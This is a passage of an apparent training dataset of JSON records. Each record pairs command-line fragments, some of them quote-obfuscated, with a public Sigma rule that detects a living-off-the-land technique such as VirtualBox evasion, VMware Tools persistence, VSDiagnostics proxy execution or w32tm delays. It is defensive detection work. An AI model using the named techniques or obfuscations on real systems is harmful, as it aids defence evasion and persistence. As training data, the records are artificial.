'startvm'\n            - 'controlvm'\n    condition: 1 of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - This may have false positives on hosts where Virtualbox is legitimately being used for operations\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "VBoxRT.dll,RTR3Init controlvm VBoxDrv.sys startvm VBoxC.dll", "output": "title: Detect Virtualbox Driver Installation OR Starting Of VMs\nid: bab049ca-7471-4828-9024-38279a4c04da\nstatus: test\ndescription: Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.\nreferences:\n    - https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\n    - https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/\nauthor: Janantha Marasinghe\ndate: 2020-09-26\nmodified: 2022-07-14\ntags:\n    - attack.defense-evasion\n    - attack.t1564.006\n    - attack.t1564\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'VBoxRT.dll,RTR3Init'\n            - 'VBoxC.dll'\n            - 'VBoxDrv.sys'\n    selection_2:\n        CommandLine|contains:\n            - 'startvm'\n            - 'controlvm'\n    condition: 1 of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - This may have false positives on hosts where Virtualbox is legitimately being used for operations\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VBoxDrvInst.exe driver executeinf", "output": "title: Suspicious VBoxDrvInst.exe Parameters\nid: b7b19cb6-9b32-4fc4-a108-73f19acfe262\nstatus: test\ndescription: |\n  Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\n  This allows to create values in the registry and install drivers.\n  For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml\n    - https://twitter.com/pabraeken/status/993497996179492864\nauthor: Konstantin Grishchenko, oscd.community\ndate: 2020-10-06\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\VBoxDrvInst.exe'\n        CommandLine|contains|all:\n            - 'driver'\n            - 'executeinf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation process\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VBoxDrvInst.exe \"driver\" executeinf", "output": "title: Suspicious VBoxDrvInst.exe Parameters\nid: b7b19cb6-9b32-4fc4-a108-73f19acfe262\nstatus: test\ndescription: |\n  Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\n  This allows to create values in the registry and install drivers.\n  For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml\n    - https://twitter.com/pabraeken/status/993497996179492864\nauthor: Konstantin Grishchenko, oscd.community\ndate: 2020-10-06\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\VBoxDrvInst.exe'\n        CommandLine|contains|all:\n            - 'driver'\n            - 'executeinf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation process\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VBoxDrvInst driver executeinf", "output": "title: Suspicious VBoxDrvInst.exe Parameters\nid: b7b19cb6-9b32-4fc4-a108-73f19acfe262\nstatus: test\ndescription: |\n  Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\n  This allows to create values in the registry and install drivers.\n  For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml\n    - https://twitter.com/pabraeken/status/993497996179492864\nauthor: Konstantin Grishchenko, oscd.community\ndate: 2020-10-06\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\VBoxDrvInst.exe'\n        CommandLine|contains|all:\n            - 'driver'\n            - 'executeinf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation process\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VBoxDrvInst.exe driver executeinf", "output": "title: Suspicious VBoxDrvInst.exe Parameters\nid: b7b19cb6-9b32-4fc4-a108-73f19acfe262\nstatus: test\ndescription: |\n  Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\n  This allows to create values in the registry and install drivers.\n  For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml\n    - https://twitter.com/pabraeken/status/993497996179492864\nauthor: Konstantin Grishchenko, oscd.community\ndate: 2020-10-06\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\VBoxDrvInst.exe'\n        CommandLine|contains|all:\n            - 'driver'\n            - 'executeinf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation process\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VMwareToolBoxCmd.exe toolbox-cmd.exe script set", "output": "title: Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script\nid: 7aa4e81a-a65c-4e10-9f81-b200eb229d7d\nrelated:\n    - id: 236d8e89-ed95-4789-a982-36f4643738ba\n      type: derived\nstatus: test\ndescription: Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state\nreferences:\n    - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/\n    - https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-14\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VMwareToolBoxCmd.exe'\n        - OriginalFileName: 'toolbox-cmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' script '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VMwareToolBoxCmd.exe \\\"t\\\"\\\"o\\\"\\\"o\\\"\\\"l\\\"\\\"b\\\"\\\"o\\\"\\\"x\\\"\\\"-\\\"\\\"c\\\"\\\"m\\\"\\\"d\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" script set", "output": "title: Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script\nid: 7aa4e81a-a65c-4e10-9f81-b200eb229d7d\nrelated:\n    - id: 236d8e89-ed95-4789-a982-36f4643738ba\n      type: derived\nstatus: test\ndescription: Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state\nreferences:\n    - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/\n    - https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-14\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VMwareToolBoxCmd.exe'\n        - OriginalFileName: 'toolbox-cmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' script '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VMwareToolBoxCmd toolbox-cmd script set", "output": "title: Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script\nid: 7aa4e81a-a65c-4e10-9f81-b200eb229d7d\nrelated:\n    - id: 236d8e89-ed95-4789-a982-36f4643738ba\n      type: derived\nstatus: test\ndescription: Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state\nreferences:\n    - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/\n    - https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-14\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VMwareToolBoxCmd.exe'\n        - OriginalFileName: 'toolbox-cmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' script '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VMwareToolBoxCmd.exe set toolbox-cmd.exe script", "output": "title: Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script\nid: 7aa4e81a-a65c-4e10-9f81-b200eb229d7d\nrelated:\n    - id: 236d8e89-ed95-4789-a982-36f4643738ba\n      type: derived\nstatus: test\ndescription: Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state\nreferences:\n    - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/\n    - https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-14\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VMwareToolBoxCmd.exe'\n        - OriginalFileName: 'toolbox-cmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' script '\n            - ' set '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel service internal-run tunnel-service.log", "output": "title: Visual Studio Code Tunnel Service Installation\nid: 30bf1789-379d-4fdc-900f-55cd0a90a801\nstatus: test\ndescription: Detects the installation of VsCode tunnel (code-tunnel) as a service.\nreferences:\n    - https://ipfyx.fr/post/visual-studio-code-tunnel/\n    - https://badoption.eu/blog/2023/01/31/code_c2.html\n    - https://code.visualstudio.com/docs/remote/tunnels\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-10-25\ntags:\n    - attack.command-and-control\n    - attack.t1071.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'tunnel '\n            - 'service'\n            - 'internal-run'\n            - 'tunnel-service.log'\n    condition: selection\nfalsepositives:\n    - Legitimate installation of code-tunnel as a service\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel \"service\" internal-run tunnel-service.log", "output": "title: Visual Studio Code Tunnel Service Installation\nid: 30bf1789-379d-4fdc-900f-55cd0a90a801\nstatus: test\ndescription: Detects the installation of VsCode tunnel (code-tunnel) as a service.\nreferences:\n    - https://ipfyx.fr/post/visual-studio-code-tunnel/\n    - https://badoption.eu/blog/2023/01/31/code_c2.html\n    - https://code.visualstudio.com/docs/remote/tunnels\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-10-25\ntags:\n    - attack.command-and-control\n    - attack.t1071.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'tunnel '\n            - 'service'\n            - 'internal-run'\n            - 'tunnel-service.log'\n    condition: selection\nfalsepositives:\n    - Legitimate installation of code-tunnel as a service\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel service internal-run tunnel-service.log", "output": "title: Visual Studio Code Tunnel Service Installation\nid: 30bf1789-379d-4fdc-900f-55cd0a90a801\nstatus: test\ndescription: Detects the installation of VsCode tunnel (code-tunnel) as a service.\nreferences:\n    - https://ipfyx.fr/post/visual-studio-code-tunnel/\n    - https://badoption.eu/blog/2023/01/31/code_c2.html\n    - https://code.visualstudio.com/docs/remote/tunnels\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-10-25\ntags:\n    - attack.command-and-control\n    - attack.t1071.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'tunnel '\n            - 'service'\n            - 'internal-run'\n            - 'tunnel-service.log'\n    condition: selection\nfalsepositives:\n    - Legitimate installation of code-tunnel as a service\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSDiagnostics.exe VSDiagnostics.exe start /launch: -launch:", "output": "title: Potential Binary Proxy Execution Via VSDiagnostics.EXE\nid: ac1c92b4-ac81-405a-9978-4604d78cc47e\nstatus: test\ndescription: Detects execution of \"VSDiagnostics.exe\" with the \"start\" command in order to launch and proxy arbitrary binaries.\nreferences:\n    - https://twitter.com/0xBoku/status/1679200664013135872\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-08-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSDiagnostics.exe'\n        - OriginalFileName: 'VSDiagnostics.exe'\n    selection_cli_start:\n        CommandLine|contains: 'start'\n    selection_cli_launch:\n        CommandLine|contains:\n            - ' /launch:'\n            - ' -launch:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for tracing and diagnostics purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSDiagnostics.exe \"V\"\"S\"\"D\"\"i\"\"a\"\"g\"\"n\"\"o\"\"s\"\"t\"\"i\"\"c\"\"s\"\".\"\"e\"\"x\"\"e\" start /launch: -launch:", "output": "title: Potential Binary Proxy Execution Via VSDiagnostics.EXE\nid: ac1c92b4-ac81-405a-9978-4604d78cc47e\nstatus: test\ndescription: Detects execution of \"VSDiagnostics.exe\" with the \"start\" command in order to launch and proxy arbitrary binaries.\nreferences:\n    - https://twitter.com/0xBoku/status/1679200664013135872\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-08-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSDiagnostics.exe'\n        - OriginalFileName: 'VSDiagnostics.exe'\n    selection_cli_start:\n        CommandLine|contains: 'start'\n    selection_cli_launch:\n        CommandLine|contains:\n            - ' /launch:'\n            - ' -launch:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for tracing and diagnostics purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSDiagnostics VSDiagnostics start /launch: -launch:", "output": "title: Potential Binary Proxy Execution Via VSDiagnostics.EXE\nid: ac1c92b4-ac81-405a-9978-4604d78cc47e\nstatus: test\ndescription: Detects execution of \"VSDiagnostics.exe\" with the \"start\" command in order to launch and proxy arbitrary binaries.\nreferences:\n    - https://twitter.com/0xBoku/status/1679200664013135872\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-08-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSDiagnostics.exe'\n        - OriginalFileName: 'VSDiagnostics.exe'\n    selection_cli_start:\n        CommandLine|contains: 'start'\n    selection_cli_launch:\n        CommandLine|contains:\n            - ' /launch:'\n            - ' -launch:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for tracing and diagnostics purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VSDiagnostics.exe VSDiagnostics.exe start /launch: -launch:", "output": "title: Potential Binary Proxy Execution Via VSDiagnostics.EXE\nid: ac1c92b4-ac81-405a-9978-4604d78cc47e\nstatus: test\ndescription: Detects execution of \"VSDiagnostics.exe\" with the \"start\" command in order to launch and proxy arbitrary binaries.\nreferences:\n    - https://twitter.com/0xBoku/status/1679200664013135872\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-08-03\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSDiagnostics.exe'\n        - OriginalFileName: 'VSDiagnostics.exe'\n    selection_cli_start:\n        CommandLine|contains: 'start'\n    selection_cli_launch:\n        CommandLine|contains:\n            - ' /launch:'\n            - ' -launch:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage for tracing and diagnostics purposes\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsls-agent.exe --agentExtensionPath Microsoft.VisualStudio.LiveShare.Agent.", "output": "title: Suspicious Vsls-Agent Command With AgentExtensionPath Load\nid: 43103702-5886-11ed-9b6a-0242ac120002\nstatus: test\ndescription: Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter\nreferences:\n    - https://twitter.com/bohops/status/1583916360404729857\nauthor: bohops\ndate: 2022-10-30\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\vsls-agent.exe'\n        CommandLine|contains: '--agentExtensionPath'\n    filter:\n        CommandLine|contains: 'Microsoft.VisualStudio.LiveShare.Agent.'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on custom use of vsls-agent.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsls-agent.exe \"--agentExt\"ensionPath Microsoft.VisualStudio.LiveShare.Agent.", "output": "title: Suspicious Vsls-Agent Command With AgentExtensionPath Load\nid: 43103702-5886-11ed-9b6a-0242ac120002\nstatus: test\ndescription: Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter\nreferences:\n    - https://twitter.com/bohops/status/1583916360404729857\nauthor: bohops\ndate: 2022-10-30\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\vsls-agent.exe'\n        CommandLine|contains: '--agentExtensionPath'\n    filter:\n        CommandLine|contains: 'Microsoft.VisualStudio.LiveShare.Agent.'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on custom use of vsls-agent.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsls-agent --agentExtensionPath Microsoft.VisualStudio.LiveShare.Agent.", "output": "title: Suspicious Vsls-Agent Command With AgentExtensionPath Load\nid: 43103702-5886-11ed-9b6a-0242ac120002\nstatus: test\ndescription: Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter\nreferences:\n    - https://twitter.com/bohops/status/1583916360404729857\nauthor: bohops\ndate: 2022-10-30\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\vsls-agent.exe'\n        CommandLine|contains: '--agentExtensionPath'\n    filter:\n        CommandLine|contains: 'Microsoft.VisualStudio.LiveShare.Agent.'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on custom use of vsls-agent.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsls-agent.exe --agentExtensionPath Microsoft.VisualStudio.LiveShare.Agent.", "output": "title: Suspicious Vsls-Agent Command With AgentExtensionPath Load\nid: 43103702-5886-11ed-9b6a-0242ac120002\nstatus: test\ndescription: Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter\nreferences:\n    - https://twitter.com/bohops/status/1583916360404729857\nauthor: bohops\ndate: 2022-10-30\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\vsls-agent.exe'\n        CommandLine|contains: '--agentExtensionPath'\n    filter:\n        CommandLine|contains: 'Microsoft.VisualStudio.LiveShare.Agent.'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on custom use of vsls-agent.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\w32tm.exe w32time.dll /stripchart /computer: /period: /dataonly /samples:", "output": "title: Use of W32tm as Timer\nid: 6da2c9f5-7c53-401b-aacb-92c040ce1215\nstatus: test\ndescription: When configured with suitable command line arguments, w32tm can act as a delay mechanism\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1124/T1124.md\n    - https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\nauthor: frack113\ndate: 2022-09-25\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_w32tm:\n        - Image|endswith: '\\w32tm.exe'\n        - OriginalFileName: 'w32time.dll'\n    selection_cmd:\n        CommandLine|contains|all:\n            - '/stripchart'\n            - '/computer:'\n            - '/period:'\n            - '/dataonly'\n            - '/samples:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\w32tm.exe w32ti\\\"me.dll\\\" /stripchart /computer: /period: /dataonly /samples:", "output": "title: Use of W32tm as Timer\nid: 6da2c9f5-7c53-401b-aacb-92c040ce1215\nstatus: test\ndescription: When configured with suitable command line arguments, w32tm can act as a delay mechanism\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1124/T1124.md\n    - https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\nauthor: frack113\ndate: 2022-09-25\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_w32tm:\n        - Image|endswith: '\\w32tm.exe'\n        - OriginalFileName: 'w32time.dll'\n    selection_cmd:\n        CommandLine|contains|all:\n            - '/stripchart'\n            - '/computer:'\n            - '/period:'\n            - '/dataonly'\n            - '/samples:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\w32tm w32time.dll /stripchart /computer: /period: /dataonly /samples:", "output": "title: Use of W32tm as Timer\nid: 6da2c9f5-7c53-401b-aacb-92c040ce1215\nstatus: test\ndescription: When configured with suitable command line arguments, w32tm can act as a delay mechanism\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1124/T1124.md\n    - https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\nauthor: frack113\ndate: 2022-09-25\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_w32tm:\n        - Image|endswith: '\\w32tm.exe'\n        - OriginalFileName: 'w32time.dll'\n    selection_cmd:\n        CommandLine|contains|all:\n            - '/stripchart'\n            - '/computer:'\n            - '/period:'\n            - '/dataonly'\n            - '/samples:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\w32tm.exe w32time.dll /stripchart /computer: /period: /dataonly /samples:", "output": "title: Use of W32tm as Timer\nid: 6da2c9f5-7c53-401b-aacb-92c040ce1215\nstatus: test\ndescription: When configured with suitable command line arguments, w32tm can act as a delay mechanism\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1124/T1124.md\n    - https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\nauthor: frack113\ndate: 2022-09-25\ntags:\n    - attack.discovery\n    - attack.t1124\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_w32tm:\n        - Image|endswith: '\\w32tm.exe'\n        - OriginalFileName: 'w32time.dll'\n    selection_cmd:\n        CommandLine|contains|all:\n            - '/stripchart'\n            - '/computer:'\n            - '/period:'\n            - '/dataonly'\n            - '/samples:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WmiPrvSE.exe \\svchost.exe \\dllhost.exe \\wab.exe \\wabmig.exe \\wab.exe \\wabmig.exe", "output": "title: Wab/Wabmig Unusual Parent Or Child Processes\nid: 63d1ccc0-2a43-4f4b-9289-361b308991ff\nstatus: test\ndescription: Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-12\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\WmiPrvSE.exe\" \\svchost.exe \\dllhost.exe \\wab.exe \\wabmig.exe \\wab.exe \\wabmig.exe", "output": "title: Wab/Wabmig Unusual Parent Or Child Processes\nid: 63d1ccc0-2a43-4f4b-9289-361b308991ff\nstatus: test\ndescription: Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity\nreferences:\n    - https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-12\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            # Add more if known\n            - \\WmiPrvSE.exe\n            - \\svchost.exe\n            - \\dllhost.exe\n        Image|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    selection_child:\n        # You can add specific suspicious child processes (such as cmd, powershell...) to increase the accuracy\n        ParentImage|endswith:\n            - '\\wab.exe'\n            - '\\wabmig.exe' # (Microsoft Address Book Import Tool)\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
